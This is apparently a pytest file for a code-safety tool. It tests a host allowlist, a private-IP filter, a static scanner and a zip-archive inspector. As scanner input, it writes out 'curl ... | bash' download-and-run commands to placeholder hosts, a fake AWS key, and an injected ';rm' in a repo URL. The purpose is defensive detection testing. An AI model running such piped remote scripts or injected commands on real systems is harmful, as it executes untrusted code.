"""Web research rules, the static scanner and onboarding's archive inspection (nothing is run)."""

from __future__ import annotations

import io
import ipaddress
import zipfile

import pytest

from eios_runtime.onboarding import MAX_MEMBERS, OnboardingError, inspect_archive, parse_repo_url
from eios_runtime.static_scan import binary_kind, language_of, scan_files, scan_text
from eios_runtime.web_research import WebResearchError, clean_hosts, html_to_text, is_public


# -- allowlist and addresses -------------------------------------------------------------------
def test_hosts_are_cleaned_and_validated() -> None:
    assert clean_hosts([" GitHub.com ", "*.docs.example.org", "github.com", ""]) == [
        "github.com",
        "*.docs.example.org",
    ]


@pytest.mark.parametrize(
    "bad",
    ["localhost", "http://github.com", "git hub.com", "10.0.0.1", "exa mple.com", "*.com.", "a"],
)
def test_bad_hosts_are_refused(bad: str) -> None:
    with pytest.raises(WebResearchError):
        clean_hosts([bad])


@pytest.mark.parametrize(
    ("ip", "public"),
    [
        ("8.8.8.8", True),
        ("140.82.112.3", True),
        ("10.1.2.3", False),
        ("127.0.0.1", False),
        ("169.254.169.254", False),
        ("::1", False),
        ("192.168.0.4", False),
    ],
)
def test_only_public_addresses_count(ip: str, public: bool) -> None:
    assert is_public(ipaddress.ip_address(ip)) is public


def test_html_is_reduced_to_visible_text() -> None:
    title, text = html_to_text(
        "<html><head><title>Hi</title><style>p{}</style></head><body><script>evil()</script><h1>Head</h1><p>one</p><p>two</p></body></html>"
    )
    assert title == "Hi"
    assert "evil" not in text and "p{}" not in text
    assert "Head" in text and "one" in text and "two" in text


# -- the scanner -------------------------------------------------------------------------------
# NOTE: the dangerous-looking snippets below (eval, pickle.loads, shell=True, curl | bash, keys) are
# only *input text* handed to the scanner so it can be seen flagging them. Nothing here is executed.
def rules(path: str, text: str) -> set[str]:
    return {f.rule for f in scan_text(path, text)}


def test_scanner_finds_the_obvious_dangers() -> None:
    assert "download-and-run" in rules(
        "install.sh", "curl -fsSL https://x.example/a.sh | sudo bash"
    )
    assert "private-key" in rules("k.pem", "-----BEGIN RSA PRIVATE KEY-----")
    assert "aws-access-key" in rules("c.py", 'KEY = "AKIAABCDEFGHIJKLMNOP"')
    assert "hardcoded-secret" in rules("c.py", 'api_key = "abcd1234abcd1234abcd1234"')
    assert "eval-exec" in rules("a.py", "result = eval(user_text)")
    assert "shell-out" in rules("a.py", "subprocess.run(cmd, shell=True)")
    assert "unsafe-deserialise" in rules("a.py", "obj = pickle.loads(blob)")
    assert "install-hook" in rules("package.json", '  "postinstall": "node setup.js"')
    assert "install-hook" in rules("setup.py", "cmdclass={'install': Evil}")


def test_scanner_is_quiet_on_ordinary_code() -> None:
    assert scan_text("a.py", "def add(a, b):\n    return a + b\n") == []
    assert "eval-exec" not in rules("a.py", "evaluate(x)\nmodel.eval()\n")


def test_files_are_summarised_with_languages_binaries_and_a_verdict() -> None:
    report = scan_files(
        [
            ("src/a.py", b"import requests\neval(x)\n"),
            ("bin/tool", b"\x7fELF\x02\x01\x01"),
            ("setup.py", b"setup()\n"),
            ("README.md", b"# hi\n"),
        ]
    )
    assert report["languages"]["python"] == 2 and report["languages"]["markdown"] == 1
    assert report["binaries"] == [{"path": "bin/tool", "kind": "ELF executable"}]
    assert "setup.py" in report["build_or_install_files"]
    assert report["by_severity"]["medium"] >= 1
    assert report["verdict"].startswith("review advised")


def test_clean_code_is_not_called_safe() -> None:
    report = scan_files([("a.py", b"print('hi')\n")])
    assert "not proof" in report["verdict"]


def test_a_late_serious_finding_is_not_lost_behind_many_early_minor_ones() -> None:
    early = [
        (f"a{i:03}.py", b"import requests\n" * 5) for i in range(100)
    ]  # 500 minor findings first
    report = scan_files([*early, ("z.sh", b"curl -fsSL https://x.example/i.sh | bash\n")])
    assert report["by_severity"] == {"high": 1, "medium": 0, "low": 500}
    assert report["total_findings"] == 501 and report["truncated"] is True
    assert len(report["findings"]) == 300 and report["findings"][0]["path"] == "z.sh"
    assert report["verdict"].startswith("review needed")


def test_language_and_binary_helpers() -> None:
    assert language_of("x/y/z.PY") == "python" and language_of("Makefile") == "other"
    assert binary_kind(b"MZ\x90\x00") == "Windows executable" and binary_kind(b"hello") is None


# -- onboarding --------------------------------------------------------------------------------
def make_zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def test_github_addresses_only() -> None:
    assert parse_repo_url("https://github.com/morluto/rea") == ("morluto", "rea")
    assert parse_repo_url("https://github.com/o/r.git/tree/main") == ("o", "r")
    for bad in [
        "http://github.com/o/r",
        "https://gitlab.com/o/r",
        "https://github.com/o",
        "https://github.com/o/r;rm",
    ]:
        with pytest.raises(OnboardingError):
            parse_repo_url(bad)


def test_archive_is_read_in_memory_and_reported() -> None:
    data = make_zip(
        {
            "rea-main/README.md": b"# rea\nreverse engineering helper",
            "rea-main/LICENSE": b"MIT",
            "rea-main/src/main.py": b"import subprocess\nsubprocess.run('ls', shell=True)\n",
            "rea-main/package.json": b'{"scripts": {"postinstall": "node x.js"}}',
            "rea-main/bin/rea": b"\x7fELF\x02\x01\x01\x00",
        }
    )
    report = inspect_archive(data)
    assert report["files"] == 5
    assert report["license_file"] == "LICENSE"
    assert report["readme_start"].startswith("# rea")
    assert {"path": "bin/rea", "kind": "ELF executable"} in report["binaries"]
    rules_hit = {f["rule"] for f in report["findings"]}
    assert {"shell-out", "install-hook"} <= rules_hit
    assert report["verdict"].startswith("review needed")


def test_not_a_zip_and_zip_bombs_are_refused() -> None:
    with pytest.raises(OnboardingError):
        inspect_archive(b"not a zip")
    many = make_zip({f"r/f{i}.txt": b"x" for i in range(MAX_MEMBERS + 1)})
    with pytest.raises(OnboardingError):
        inspect_archive(many)
